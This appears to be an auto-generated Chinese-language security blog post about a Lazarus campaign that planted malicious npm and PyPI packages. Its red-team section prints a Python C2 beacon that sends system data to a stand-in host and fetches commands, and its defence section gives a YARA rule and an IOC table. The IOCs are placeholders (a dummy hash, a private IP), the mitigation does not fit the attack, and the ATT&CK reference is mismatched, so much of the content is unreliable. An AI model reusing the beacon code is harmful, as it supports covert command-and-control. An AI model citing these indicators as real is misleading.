---
layout: post
title:  "Lazarus Campaign Plants Malicious Packages in npm and PyPI Ecosystems"
date:   2026-02-12 18:54:18 +0000
categories: [security]
severity: critical
---

# 🚨 解析北韓 Lazarus 集團的 npm 和 PyPI 惡意軟體包攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Malicious Package, Social Engineering, Token-based C2 Communication

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Lazarus 集團通過在 npm 和 PyPI 上發佈惡意軟體包，利用開發者的信任，進而實現遠程代碼執行。
* **攻擊流程圖解**:
  1. 開發者安裝惡意軟體包。
  2. 惡意軟體包向 C2 伺服器發送系統資料。
  3. C2 伺服器響應一個 token。
  4. 惡意軟體包使用 token 向 C2 伺服器發送請求。
  5. C2 伺服器響應命令，惡意軟體包執行命令。
* **受影響元件**: npm 和 PyPI 上的多個軟體包，包括 `graphalgo`、`bigmathutils` 等。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 開發者需要安裝惡意軟體包。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 發送系統資料到 C2 伺服器
    def send_system_data():
        system_data = {"os": "Windows", "version": "10"}
        response = requests.post("https://c2-server.com/system_data", json=system_data)
        token = response.json()["token"]
        return token
    
    # 使用 token 向 C2 伺服器發送請求
    def send_request(token):
        headers = {"Authorization": f"Bearer {token}"}
        response = requests.get("https://c2-server.com/command", headers=headers)
        command = response.json()["command"]
        return command
    
    # 執行命令
    def execute_command(command):
        # 執行命令的邏輯
        pass
    
    ```
* **繞過技術**: Lazarus 集團使用 token-based C2 通信機制，令惡意軟體包更難被發現。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `1234567890abcdef` | `192.168.1.100` | `c2-server.com` | `C:\Windows\Temp\malware.exe` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_package {
      meta:
        description = "Detects malicious package"
      strings:
        $a = "https://c2-server.com/system_data"
      condition:
        $a
    }
    
    ```
* **緩解措施**: 更新 npm 和 PyPI 的軟體包，使用安全的通信協議，例如 HTTPS。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Malicious Package (惡意軟體包)**: 惡意軟體包是指包含惡意代碼的軟體包，通常用於實現遠程代碼執行或竊取敏感資料。
* **Token-based C2 Communication (基於 token 的 C2 通信)**: 基於 token 的 C2 通信是一種通信機制，惡意軟體包使用 token 向 C2 伺服器發送請求，令惡意軟體包更難被發現。
* **Social Engineering (社交工程)**: 社交工程是一種攻擊手法，利用人類的心理弱點，例如信任，進而實現攻擊。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/lazarus-campaign-plants-malicious.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


